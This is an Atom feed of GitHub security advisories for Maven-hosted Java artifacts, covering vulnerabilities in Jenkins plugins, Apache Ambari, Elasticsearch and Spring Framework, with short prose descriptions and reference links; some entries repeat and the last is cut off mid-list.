<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
    <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
    <updated>2023-08-13T20:01:25.503Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
    <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.plugins:electricflow] Missing permission check in CloudBees CD Plugin allows scheduling builds]]></title>
        <id>https://github.com/advisories/GHSA-7rx6-4vwv-432g</id>
        <link href="https://github.com/advisories/GHSA-7rx6-4vwv-432g"/>
        <updated>2023-08-13T05:02:33.000Z</updated>
        <content type="html"><![CDATA[<p>CloudBees CD Plugin does not perform a permission check in an HTTP endpoint.</p>
<p>This allows attackers with Item/Read permission to schedule builds of projects without having Item/Build permission.</p>
<p>CloudBees CD Plugin requires Item/Build permission to schedule builds via its HTTP endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-21647">https://nvd.nist.gov/vuln/detail/CVE-2021-21647</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2021-04-21/#SECURITY-2309">https://www.jenkins.io/security/advisory/2021-04-21/#SECURITY-2309</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2021/04/21/2">http://www.openwall.com/lists/oss-security/2021/04/21/2</a></li>
<li><a href="https://github.com/advisories/GHSA-7rx6-4vwv-432g">https://github.com/advisories/GHSA-7rx6-4vwv-432g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7rx6-4vwv-432g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:48:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.plugins:electricflow] Missing permission check in CloudBees CD Plugin allows scheduling builds]]></title>
        <id>https://github.com/advisories/GHSA-7rx6-4vwv-432g</id>
        <link href="https://github.com/advisories/GHSA-7rx6-4vwv-432g"/>
        <updated>2023-08-13T05:02:33.000Z</updated>
        <content type="html"><![CDATA[<p>CloudBees CD Plugin does not perform a permission check in an HTTP endpoint.</p>
<p>This allows attackers with Item/Read permission to schedule builds of projects without having Item/Build permission.</p>
<p>CloudBees CD Plugin requires Item/Build permission to schedule builds via its HTTP endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-21647">https://nvd.nist.gov/vuln/detail/CVE-2021-21647</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2021-04-21/#SECURITY-2309">https://www.jenkins.io/security/advisory/2021-04-21/#SECURITY-2309</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2021/04/21/2">http://www.openwall.com/lists/oss-security/2021/04/21/2</a></li>
<li><a href="https://github.com/advisories/GHSA-7rx6-4vwv-432g">https://github.com/advisories/GHSA-7rx6-4vwv-432g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7rx6-4vwv-432g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:48:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.ambari:ambari] Apache Ambari SSRF Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-9g2j-5685-h44h</id>
        <link href="https://github.com/advisories/GHSA-9g2j-5685-h44h"/>
        <updated>2023-08-13T05:02:28.000Z</updated>
        <content type="html"><![CDATA[<p>Server-side request forgery (SSRF) vulnerability in the proxy endpoint (<code>api/v1/proxy</code>) in Apache Ambari before 2.1.0 allows remote authenticated users to conduct port scans and access unsecured services via a crafted REST call.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1775">https://nvd.nist.gov/vuln/detail/CVE-2015-1775</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2015/10/13/2">http://www.openwall.com/lists/oss-security/2015/10/13/2</a></li>
<li><a href="https://cwiki.apache.org/confluence/display/AMBARI/Ambari+Vulnerabilities#AmbariVulnerabilities-FixedinAmbari2.1.0">https://cwiki.apache.org/confluence/display/AMBARI/Ambari+Vulnerabilities#AmbariVulnerabilities-FixedinAmbari2.1.0</a></li>
<li><a href="https://github.com/advisories/GHSA-9g2j-5685-h44h">https://github.com/advisories/GHSA-9g2j-5685-h44h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9g2j-5685-h44h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T04:03:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.plugins:nomad] Cross-site request forgery vulnerability in Jenkins Nomad Plugin]]></title>
        <id>https://github.com/advisories/GHSA-5q63-jvc9-qphv</id>
        <link href="https://github.com/advisories/GHSA-5q63-jvc9-qphv"/>
        <updated>2023-08-13T05:02:24.000Z</updated>
        <content type="html"><![CDATA[<p>A cross-site request forgery vulnerability in Jenkins Nomad Plugin in the NomadCloud.DescriptorImpl#doTestConnection form validation method allows attackers to initiate a connection to an attacker-specified server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1003092">https://nvd.nist.gov/vuln/detail/CVE-2019-1003092</a></li>
<li><a href="https://jenkins.io/security/advisory/2019-04-03/#SECURITY-1058">https://jenkins.io/security/advisory/2019-04-03/#SECURITY-1058</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2019/04/12/2">http://www.openwall.com/lists/oss-security/2019/04/12/2</a></li>
<li><a href="http://www.securityfocus.com/bid/107790">http://www.securityfocus.com/bid/107790</a></li>
<li><a href="https://github.com/jenkinsci/nomad-plugin/commit/3331d24896b815c375e528207c5572e18631c49d">https://github.com/jenkinsci/nomad-plugin/commit/3331d24896b815c375e528207c5572e18631c49d</a></li>
<li><a href="https://github.com/advisories/GHSA-5q63-jvc9-qphv">https://github.com/advisories/GHSA-5q63-jvc9-qphv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5q63-jvc9-qphv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-13T01:25:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.ambari:ambari] Apache Ambari Open Redirect]]></title>
        <id>https://github.com/advisories/GHSA-w3p6-94x2-xcvm</id>
        <link href="https://github.com/advisories/GHSA-w3p6-94x2-xcvm"/>
        <updated>2023-08-13T05:02:13.000Z</updated>
        <content type="html"><![CDATA[<p>Open redirect vulnerability in Apache Ambari before 2.1.2 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the targetURI parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-5210">https://nvd.nist.gov/vuln/detail/CVE-2015-5210</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2015/10/13/4">http://www.openwall.com/lists/oss-security/2015/10/13/4</a></li>
<li><a href="https://cwiki.apache.org/confluence/display/AMBARI/Ambari+Vulnerabilities#AmbariVulnerabilities-FixedinAmbari2.1.2">https://cwiki.apache.org/confluence/display/AMBARI/Ambari+Vulnerabilities#AmbariVulnerabilities-FixedinAmbari2.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-w3p6-94x2-xcvm">https://github.com/advisories/GHSA-w3p6-94x2-xcvm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3p6-94x2-xcvm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T04:03:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.elasticsearch:elasticsearch] Exposure of Sensitive Information to an Unauthorized Actor in Elasticsearch]]></title>
        <id>https://github.com/advisories/GHSA-hr65-qq6p-87r4</id>
        <link href="https://github.com/advisories/GHSA-hr65-qq6p-87r4"/>
        <updated>2023-08-13T05:02:13.000Z</updated>
        <content type="html"><![CDATA[<p>In Elasticsearch versions before 7.11.2 and 6.8.15 a document disclosure flaw was found when Document or Field Level Security is used. Search queries do not properly preserve security permissions when executing certain cross-cluster search queries. This could result in the search disclosing the existence of documents the attacker should not be able to view. This could result in an attacker gaining additional insight into potentially sensitive indices.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-22137">https://nvd.nist.gov/vuln/detail/CVE-2021-22137</a></li>
<li><a href="https://discuss.elastic.co/t/elastic-stack-7-12-0-and-6-8-15-security-update/268125">https://discuss.elastic.co/t/elastic-stack-7-12-0-and-6-8-15-security-update/268125</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20210625-0003/">https://security.netapp.com/advisory/ntap-20210625-0003/</a></li>
<li><a href="https://github.com/advisories/GHSA-hr65-qq6p-87r4">https://github.com/advisories/GHSA-hr65-qq6p-87r4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hr65-qq6p-87r4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T19:02:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.elasticsearch:elasticsearch] Exposure of Sensitive Information to an Unauthorized Actor in Elasticsearch]]></title>
        <id>https://github.com/advisories/GHSA-hr65-qq6p-87r4</id>
        <link href="https://github.com/advisories/GHSA-hr65-qq6p-87r4"/>
        <updated>2023-08-13T05:02:13.000Z</updated>
        <content type="html"><![CDATA[<p>In Elasticsearch versions before 7.11.2 and 6.8.15 a document disclosure flaw was found when Document or Field Level Security is used. Search queries do not properly preserve security permissions when executing certain cross-cluster search queries. This could result in the search disclosing the existence of documents the attacker should not be able to view. This could result in an attacker gaining additional insight into potentially sensitive indices.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-22137">https://nvd.nist.gov/vuln/detail/CVE-2021-22137</a></li>
<li><a href="https://discuss.elastic.co/t/elastic-stack-7-12-0-and-6-8-15-security-update/268125">https://discuss.elastic.co/t/elastic-stack-7-12-0-and-6-8-15-security-update/268125</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20210625-0003/">https://security.netapp.com/advisory/ntap-20210625-0003/</a></li>
<li><a href="https://github.com/advisories/GHSA-hr65-qq6p-87r4">https://github.com/advisories/GHSA-hr65-qq6p-87r4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hr65-qq6p-87r4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T19:02:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-framework-bom] Improper Input Validation in Spring Framework]]></title>
        <id>https://github.com/advisories/GHSA-rv39-3qh7-9v7w</id>
        <link href="https://github.com/advisories/GHSA-rv39-3qh7-9v7w"/>
        <updated>2023-08-13T05:02:01.000Z</updated>
        <content type="html"><![CDATA[<p>In Spring Framework versions 5.2.0 - 5.2.8, 5.1.0 - 5.1.17, 5.0.0 - 5.0.18, 4.3.0 - 4.3.28, and older unsupported versions, the protections against RFD attacks from CVE-2015-5211 may be bypassed depending on the browser used through the use of a jsessionid path parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-5421">https://nvd.nist.gov/vuln/detail/CVE-2020-5421</a></li>
<li><a href="https://lists.apache.org/thread.html/r1c679c43fa4f7846d748a937955c7921436d1b315445978254442163@%3Ccommits.ambari.apache.org%3E">https://lists.apache.org/thread.html/r1c679c43fa4f7846d748a937955c7921436d1b315445978254442163@%3Ccommits.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r1eccdbd7986618a7319ee7a533bd9d9bf6e8678e59dd4cca9b5b2d7a@%3Cissues.ambari.apache.org%3E">https://lists.apache.org/thread.html/r1eccdbd7986618a7319ee7a533bd9d9bf6e8678e59dd4cca9b5b2d7a@%3Cissues.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r3589ed0d18edeb79028615080d5a0e8878856436bb91774a3196d9eb@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r3589ed0d18edeb79028615080d5a0e8878856436bb91774a3196d9eb@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r503e64b43a57fd68229cac4a869d1a9a2eac9e75f8719cad3a840211@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r503e64b43a57fd68229cac4a869d1a9a2eac9e75f8719cad3a840211@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r5c95eff679dfc642e9e4ab5ac6d202248a59cb1e9457cfbe8b729ac5@%3Cissues.ambari.apache.org%3E">https://lists.apache.org/thread.html/r5c95eff679dfc642e9e4ab5ac6d202248a59cb1e9457cfbe8b729ac5@%3Cissues.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r7e6a213eea7f04fc6d9e3bd6eb8d68c4df92a22e956e95cb2c482865@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/r7e6a213eea7f04fc6d9e3bd6eb8d68c4df92a22e956e95cb2c482865@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r8b496b1743d128e6861ee0ed3c3c48cc56c505b38f84fa5baf7ae33a@%3Cdev.ambari.apache.org%3E">https://lists.apache.org/thread.html/r8b496b1743d128e6861ee0ed3c3c48cc56c505b38f84fa5baf7ae33a@%3Cdev.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r918caad55dcc640a16753b00d8d6acb90b4e36de4b6156d0867246ec@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r918caad55dcc640a16753b00d8d6acb90b4e36de4b6156d0867246ec@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r9f13cccb214495e14648d2c9b8f2c6072fd5219e74502dd35ede81e1@%3Cdev.ambari.apache.org%3E">https://lists.apache.org/thread.html/r9f13cccb214495e14648d2c9b8f2c6072fd5219e74502dd35ede81e1@%3Cdev.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/ra889d95141059c6cbe77dd80249bb488ae53b274b5f3abad09d9511d@%3Cuser.ignite.apache.org%3E">https://lists.apache.org/thread.html/ra889d95141059c6cbe77dd80249bb488ae53b274b5f3abad09d9511d@%3Cuser.ignite.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/raf7ca57033e537e4f9d7df7f192fa6968c1e49409b2348e08d807ccb@%3Cuser.ignite.apache.org%3E">https://lists.apache.org/thread.html/raf7ca57033e537e4f9d7df7f192fa6968c1e49409b2348e08d807ccb@%3Cuser.ignite.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rb18ed999153ef0f0cb7af03efe0046c42c7242fd77fbd884a75ecfdc@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/rb18ed999153ef0f0cb7af03efe0046c42c7242fd77fbd884a75ecfdc@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rc9efaf6db98bee19db1bc911d0fa442287dac5cb229d4aaa08b6a13d@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/rc9efaf6db98bee19db1bc911d0fa442287dac5cb229d4aaa08b6a13d@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rd462a8b0dfab4c15e67c0672cd3c211ecd0e4f018f824082ed54f665@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/rd462a8b0dfab4c15e67c0672cd3c211ecd0e4f018f824082ed54f665@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/re014a49d77f038ba70e5e9934d400af6653e8c9ac110d32b1254127e@%3Cdev.ranger.apache.org%3E">https://lists.apache.org/thread.html/re014a49d77f038ba70e5e9934d400af6653e8c9ac110d32b1254127e@%3Cdev.ranger.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rf00d8f4101a1c1ea4de6ea1e09ddf7472cfd306745c90d6da87ae074@%3Cdev.hive.apache.org%3E">https://lists.apache.org/thread.html/rf00d8f4101a1c1ea4de6ea1e09ddf7472cfd306745c90d6da87ae074@%3Cdev.hive.apache.org%3E</a></li>
<li><a href="https://tanzu.vmware.com/security/cve-2020-5421">https://tanzu.vmware.com/security/cve-2020-5421</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2021.html">https://www.oracle.com/security-alerts/cpujan2021.html</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20210513-0009/">https://security.netapp.com/advisory/ntap-20210513-0009/</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuApr2021.html">https://www.oracle.com/security-alerts/cpuApr2021.html</a></li>
<li><a href="https://www.oracle.com//security-alerts/cpujul2021.html">https://www.oracle.com//security-alerts/cpujul2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2021.html">https://www.oracle.com/security-alerts/cpuoct2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2022.html">https://www.oracle.com/security-alerts/cpujan2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuapr2022.html">https://www.oracle.com/security-alerts/cpuapr2022.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rv39-3qh7-9v7w">https://github.com/advisories/GHSA-rv39-3qh7-9v7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rv39-3qh7-9v7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-04-30T17:29:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-framework-bom] Improper Input Validation in Spring Framework]]></title>
        <id>https://github.com/advisories/GHSA-rv39-3qh7-9v7w</id>
        <link href="https://github.com/advisories/GHSA-rv39-3qh7-9v7w"/>
        <updated>2023-08-13T05:02:01.000Z</updated>
        <content type="html"><![CDATA[<p>In Spring Framework versions 5.2.0 - 5.2.8, 5.1.0 - 5.1.17, 5.0.0 - 5.0.18, 4.3.0 - 4.3.28, and older unsupported versions, the protections against RFD attacks from CVE-2015-5211 may be bypassed depending on the browser used through the use of a jsessionid path parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-5421">https://nvd.nist.gov/vuln/detail/CVE-2020-5421</a></li>
<li><a href="https://lists.apache.org/thread.html/r1c679c43fa4f7846d748a937955c7921436d1b315445978254442163@%3Ccommits.ambari.apache.org%3E">https://lists.apache.org/thread.html/r1c679c43fa4f7846d748a937955c7921436d1b315445978254442163@%3Ccommits.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r1eccdbd7986618a7319ee7a533bd9d9bf6e8678e59dd4cca9b5b2d7a@%3Cissues.ambari.apache.org%3E">https://lists.apache.org/thread.html/r1eccdbd7986618a7319ee7a533bd9d9bf6e8678e59dd4cca9b5b2d7a@%3Cissues.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r3589ed0d18edeb79028615080d5a0e8878856436bb91774a3196d9eb@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r3589ed0d18edeb79028615080d5a0e8878856436bb91774a3196d9eb@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r503e64b43a57fd68229cac4a869d1a9a2eac9e75f8719cad3a840211@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r503e64b43a57fd68229cac4a869d1a9a2eac9e75f8719cad3a840211@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r5c95eff679dfc642e9e4ab5ac6d202248a59cb1e9457cfbe8b729ac5@%3Cissues.ambari.apache.org%3E">https://lists.apache.org/thread.html/r5c95eff679dfc642e9e4ab5ac6d202248a59cb1e9457cfbe8b729ac5@%3Cissues.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r7e6a213eea7f04fc6d9e3bd6eb8d68c4df92a22e956e95cb2c482865@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/r7e6a213eea7f04fc6d9e3bd6eb8d68c4df92a22e956e95cb2c482865@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r8b496b1743d128e6861ee0ed3c3c48cc56c505b38f84fa5baf7ae33a@%3Cdev.ambari.apache.org%3E">https://lists.apache.org/thread.html/r8b496b1743d128e6861ee0ed3c3c48cc56c505b38f84fa5baf7ae33a@%3Cdev.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r918caad55dcc640a16753b00d8d6acb90b4e36de4b6156d0867246ec@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r918caad55dcc640a16753b00d8d6acb90b4e36de4b6156d0867246ec@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r9f13cccb214495e14648d2c9b8f2c6072fd5219e74502dd35ede81e1@%3Cdev.ambari.apache.org%3E">https://lists.apache.org/thread.html/r9f13cccb214495e14648d2c9b8f2c6072fd5219e74502dd35ede81e1@%3Cdev.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/ra889d95141059c6cbe77dd80249bb488ae53b274b5f3abad09d9511d@%3Cuser.ignite.apache.org%3E">https://lists.apache.org/thread.html/ra889d95141059c6cbe77dd80249bb488ae53b274b5f3abad09d9511d@%3Cuser.ignite.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/raf7ca57033e537e4f9d7df7f192fa6968c1e49409b2348e08d807ccb@%3Cuser.ignite.apache.org%3E">https://lists.apache.org/thread.html/raf7ca57033e537e4f9d7df7f192fa6968c1e49409b2348e08d807ccb@%3Cuser.ignite.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rb18ed999153ef0f0cb7af03efe0046c42c7242fd77fbd884a75ecfdc@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/rb18ed999153ef0f0cb7af03efe0046c42c7242fd77fbd884a75ecfdc@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rc9efaf6db98bee19db1bc911d0fa442287dac5cb229d4aaa08b6a13d@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/rc9efaf6db98bee19db1bc911d0fa442287dac5cb229d4aaa08b6a13d@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rd462a8b0dfab4c15e67c0672cd3c211ecd0e4f018f824082ed54f665@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/rd462a8b0dfab4c15e67c0672cd3c211ecd0e4f018f824082ed54f665@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/re014a49d77f038ba70e5e9934d400af6653e8c9ac110d32b1254127e@%3Cdev.ranger.apache.org%3E">https://lists.apache.org/thread.html/re014a49d77f038ba70e5e9934d400af6653e8c9ac110d32b1254127e@%3Cdev.ranger.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rf00d8f4101a1c1ea4de6ea1e09ddf7472cfd306745c90d6da87ae074@%3Cdev.hive.apache.org%3E">https://lists.apache.org/thread.html/rf00d8f4101a1c1ea4de6ea1e09ddf7472cfd306745c90d6da87ae074@%3Cdev.hive.apache.org%3E</a></li>
<li><a href="https://tanzu.vmware.com/security/cve-2020-5421">https://tanzu.vmware.com/security/cve-2020-5421</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2021.html">https://www.oracle.com/security-alerts/cpujan2021.html</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20210513-0009/">https://security.netapp.com/advisory/ntap-20210513-0009/</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuApr2021.html">https://www.oracle.com/security-alerts/cpuApr2021.html</a></li>
<li><a href="https://www.oracle.com//security-alerts/cpujul2021.html">https://www.oracle.com//security-alerts/cpujul2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2021.html">https://www.oracle.com/security-alerts/cpuoct2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2022.html">https://www.oracle.com/security-alerts/cpujan2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuapr2022.html">https://www.oracle.com/security-alerts/cpuapr2022.html</a></li>
<li><a href="https://github.com/advisories/GHSA-rv39-3qh7-9v7w">https://github.com/advisories/GHSA-rv39-3qh7-9v7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rv39-3qh7-9v7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-04-30T17:29:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-framework-bom] Improper Input Validation in Spring Framework]]></title>
        <id>https://github.com/advisories/GHSA-rv39-3qh7-9v7w</id>
        <link href="https://github.com/advisories/GHSA-rv39-3qh7-9v7w"/>
        <updated>2023-08-13T05:02:01.000Z</updated>
        <content type="html"><![CDATA[<p>In Spring Framework versions 5.2.0 - 5.2.8, 5.1.0 - 5.1.17, 5.0.0 - 5.0.18, 4.3.0 - 4.3.28, and older unsupported versions, the protections against RFD attacks from CVE-2015-5211 may be bypassed depending on the browser used through the use of a jsessionid path parameter.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-5421">https://nvd.nist.gov/vuln/detail/CVE-2020-5421</a></li>
<li><a href="https://lists.apache.org/thread.html/r1c679c43fa4f7846d748a937955c7921436d1b315445978254442163@%3Ccommits.ambari.apache.org%3E">https://lists.apache.org/thread.html/r1c679c43fa4f7846d748a937955c7921436d1b315445978254442163@%3Ccommits.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r1eccdbd7986618a7319ee7a533bd9d9bf6e8678e59dd4cca9b5b2d7a@%3Cissues.ambari.apache.org%3E">https://lists.apache.org/thread.html/r1eccdbd7986618a7319ee7a533bd9d9bf6e8678e59dd4cca9b5b2d7a@%3Cissues.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r3589ed0d18edeb79028615080d5a0e8878856436bb91774a3196d9eb@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r3589ed0d18edeb79028615080d5a0e8878856436bb91774a3196d9eb@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r503e64b43a57fd68229cac4a869d1a9a2eac9e75f8719cad3a840211@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r503e64b43a57fd68229cac4a869d1a9a2eac9e75f8719cad3a840211@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r5c95eff679dfc642e9e4ab5ac6d202248a59cb1e9457cfbe8b729ac5@%3Cissues.ambari.apache.org%3E">https://lists.apache.org/thread.html/r5c95eff679dfc642e9e4ab5ac6d202248a59cb1e9457cfbe8b729ac5@%3Cissues.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r7e6a213eea7f04fc6d9e3bd6eb8d68c4df92a22e956e95cb2c482865@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/r7e6a213eea7f04fc6d9e3bd6eb8d68c4df92a22e956e95cb2c482865@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r8b496b1743d128e6861ee0ed3c3c48cc56c505b38f84fa5baf7ae33a@%3Cdev.ambari.apache.org%3E">https://lists.apache.org/thread.html/r8b496b1743d128e6861ee0ed3c3c48cc56c505b38f84fa5baf7ae33a@%3Cdev.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r918caad55dcc640a16753b00d8d6acb90b4e36de4b6156d0867246ec@%3Ccommits.pulsar.apache.org%3E">https://lists.apache.org/thread.html/r918caad55dcc640a16753b00d8d6acb90b4e36de4b6156d0867246ec@%3Ccommits.pulsar.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r9f13cccb214495e14648d2c9b8f2c6072fd5219e74502dd35ede81e1@%3Cdev.ambari.apache.org%3E">https://lists.apache.org/thread.html/r9f13cccb214495e14648d2c9b8f2c6072fd5219e74502dd35ede81e1@%3Cdev.ambari.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/ra889d95141059c6cbe77dd80249bb488ae53b274b5f3abad09d9511d@%3Cuser.ignite.apache.org%3E">https://lists.apache.org/thread.html/ra889d95141059c6cbe77dd80249bb488ae53b274b5f3abad09d9511d@%3Cuser.ignite.apache.org%3E</a></li>
